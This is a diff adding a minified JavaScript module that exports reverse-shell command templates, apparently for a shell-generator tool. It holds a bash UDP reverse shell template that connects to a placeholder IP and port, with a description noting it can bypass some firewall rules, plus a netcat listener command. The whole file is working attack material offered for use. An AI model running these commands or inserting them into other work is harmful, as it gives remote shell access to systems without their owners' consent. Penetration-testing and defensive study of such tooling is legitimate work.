@@ -1,0 +1,1 @@
+const e=[{title:"bash UDP reverse shell",template:"sh -i >& /dev/udp/{ip}/{port} 0>&1",description:"UDP variant using /dev/udp. Less reliable but can bypass some firewall rules."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
